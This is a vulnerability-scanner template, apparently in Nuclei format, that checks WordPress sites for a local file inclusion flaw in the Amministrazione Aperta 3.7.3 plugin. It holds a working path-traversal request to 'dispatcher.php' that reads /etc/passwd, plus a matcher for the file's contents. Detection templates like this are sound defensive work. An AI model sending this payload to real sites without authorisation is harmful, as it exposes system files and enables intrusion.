id: "amministrazione-aperta-lfi"
name: "WordPress Amministrazione Aperta 3.7.3 - Local File Inclusion"
severity: "high"
description: "WordPress Amministrazione Aperta 3.7.3 is vulnerable to local file inclusion."
tech:
  - "wordpress"
  - "php"
tags:
  - "wp-plugin"
  - "lfi"
  - "wp"
  - "edb"
  - "wordpress"
  - "vuln"
reference: "https://www.exploit-db.com/exploits/50838"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/amministrazione-aperta/wpgov/dispatcher.php?open=../../../../../../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:[x*]:0:0"
  - type: "status"
    status:
      - 200
